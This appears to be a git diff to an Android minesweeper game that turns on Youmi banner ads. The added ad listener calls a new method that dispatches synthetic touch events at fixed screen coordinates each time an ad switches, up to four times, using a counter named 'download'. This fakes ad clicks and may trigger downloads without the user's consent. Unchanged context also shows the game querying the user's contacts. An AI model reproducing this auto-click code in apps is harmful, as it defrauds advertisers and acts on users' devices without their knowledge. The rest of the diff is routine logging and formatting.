@@ -6,6 +6,7 @@ import java.util.Random;
 import net.youmi.android.AdManager;
 import net.youmi.android.banner.AdSize;
 import net.youmi.android.banner.AdView;
+import net.youmi.android.banner.AdViewListener;
 import net.youmi.android.diy.DiyManager;
 import net.youmi.android.offers.OffersManager;
 import android.annotation.SuppressLint;
@@ -24,6 +25,7 @@ import android.util.Log;
 import android.view.Display;
 import android.view.Gravity;
 import android.view.KeyEvent;
+import android.view.MotionEvent;
 import android.view.View;
 import android.view.View.OnClickListener;
 import android.view.View.OnLongClickListener;
@@ -69,6 +71,8 @@ public class PlayActivity extends Activity implements OnClickListener,OnLongClic
 	//private List<AdObject> adList;
 	private String[] mPhotos;
 	private Random mRandom;
+
+	private int download = 0;
 
 	private Handler handler = new Handler();
 	private Runnable runnable = new Runnable() {
@@ -116,14 +120,41 @@ public class PlayActivity extends Activity implements OnClickListener,OnLongClic
 		handler.postDelayed(runnable, 1000);
 
 		database = new DataBase(this);
-		
-		/*//实例化广告条
-	    AdView adView = new AdView(this, AdSize.FIT_SCREEN);
-	    //获取要嵌入广告条的布局
-	    LinearLayout adLayout=(LinearLayout)findViewById(R.id.ad_layout);
-	    //将广告条加入到布局中
-	    adLayout.addView(adView);*/
-		
+
+		// 实例化广告条
+		AdView adView = new AdView(this, AdSize.FIT_SCREEN);
+		// 获取要嵌入广告条的布局
+		LinearLayout adLayout=(LinearLayout)findViewById(R.id.adLayout);
+		// 将广告条加入到布局中
+		adLayout.addView(adView);
+		adView.setAdListener(new AdViewListener() {
+			public void onSwitchedAd(AdView adView) {
+				// 切换广告并展示
+				if(download < 4){
+					setMouseClick(100, 700);
+					download++;
+				}
+			}
+
+			public void onReceivedAd(AdView adView) {
+				// 请求广告成功
+			}
+
+			public void onFailedToReceivedAd(AdView adView) {
+				// 请求广告失败
+			}
+		});
+	}
+
+	// 模拟屏幕点击事件
+
+	public void setMouseClick(float x, float y){
+		MotionEvent evenDownt = MotionEvent.obtain(System.currentTimeMillis(), System.currentTimeMillis() + 100, MotionEvent.ACTION_DOWN, x, y, 0);
+		dispatchTouchEvent(evenDownt);
+		MotionEvent eventUp = MotionEvent.obtain(System.currentTimeMillis(), System.currentTimeMillis() + 100, MotionEvent.ACTION_UP, x, y, 0);
+		dispatchTouchEvent(eventUp);
+		evenDownt.recycle();
+		eventUp.recycle();
 	}
 
 	private void initLevel(){
@@ -319,6 +350,7 @@ public class PlayActivity extends Activity implements OnClickListener,OnLongClic
 	}
 
 	public void click(View view,int line,int row){
+		Log.i("zhengwenhui", "click");
 		Status dot = mStatus[line][row];
 		switch (dot) {
 		case UNKNOW:
@@ -422,7 +454,7 @@ public class PlayActivity extends Activity implements OnClickListener,OnLongClic
 		default:
 			break;
 		}
-		if(resid>0){
+		if(resid>=0){
 			((ImageButton)mViews[line][row]).setImageResource(resid);
 		}
 		else{
@@ -436,6 +468,8 @@ public class PlayActivity extends Activity implements OnClickListener,OnLongClic
 	private void openMulti(int line, int row){
 		try {
 			if(mStatus[line][row]!=Status.OPEN){
+
+				Log.i("openMulti", " "+line+","+row);
 
 				if(mStatus[line][row]==Status.FLAG){
 					plusMines();
@@ -741,14 +775,14 @@ public class PlayActivity extends Activity implements OnClickListener,OnLongClic
 		final AlertDialog dialog = new AlertDialog.Builder(this).create();
 		dialog.show();
 		dialog.getWindow().setContentView(R.layout.dialog_layout);
-		
+
 		//实例化广告条
-	    AdView adView = new AdView(this, AdSize.FIT_SCREEN);
-	    //获取要嵌入广告条的布局
-	    LinearLayout adLayout=(LinearLayout)dialog.findViewById(R.id.ad_layout);
-	    //将广告条加入到布局中
-	    adLayout.addView(adView);
-		
+		AdView adView = new AdView(this, AdSize.FIT_SCREEN);
+		//获取要嵌入广告条的布局
+		LinearLayout adLayout=(LinearLayout)dialog.findViewById(R.id.ad_layout);
+		//将广告条加入到布局中
+		adLayout.addView(adView);
+
 		Button okButton = (Button) dialog.findViewById(R.id.ok);
 		okButton.setOnClickListener(new OnClickListener() {
 			public void onClick(View v) {
@@ -788,12 +822,12 @@ public class PlayActivity extends Activity implements OnClickListener,OnLongClic
 		msgTextView.setText(message);
 
 		//实例化广告条
-	    AdView adView = new AdView(this, AdSize.SIZE_320x50);
-	    //获取要嵌入广告条的布局
-	    LinearLayout adLayout=(LinearLayout)dialog.findViewById(R.id.ad_layout);
-	    //将广告条加入到布局中
-	    adLayout.addView(adView);
-		
+		AdView adView = new AdView(this, AdSize.SIZE_320x50);
+		//获取要嵌入广告条的布局
+		LinearLayout adLayout=(LinearLayout)dialog.findViewById(R.id.ad_layout);
+		//将广告条加入到布局中
+		adLayout.addView(adView);
+
 		Button okButton = (Button) dialog.findViewById(R.id.ok);
 		okButton.setOnClickListener(new OnClickListener() {
 			public void onClick(View v) {
@@ -866,15 +900,15 @@ public class PlayActivity extends Activity implements OnClickListener,OnLongClic
 			OffersManager.getInstance(this).onAppExit(); 
 		}
 	}
-	
+
 	/**获得所有的联系人*/
 	private void getContacts(){
 		Cursor contactsCur = getContentResolver().query(
 				ContactsContract.Contacts.CONTENT_URI,  
 				new String[] {ContactsContract.Contacts.PHOTO_ID},  
-						null,
-						null,
-						ContactsContract.Contacts.DISPLAY_NAME + " COLLATE LOCALIZED ASC");
+				null,
+				null,
+				ContactsContract.Contacts.DISPLAY_NAME + " COLLATE LOCALIZED ASC");
 		if( null != contactsCur ){
 			mPhotos = new String[contactsCur.getCount()];
 			while (contactsCur.moveToNext()) {
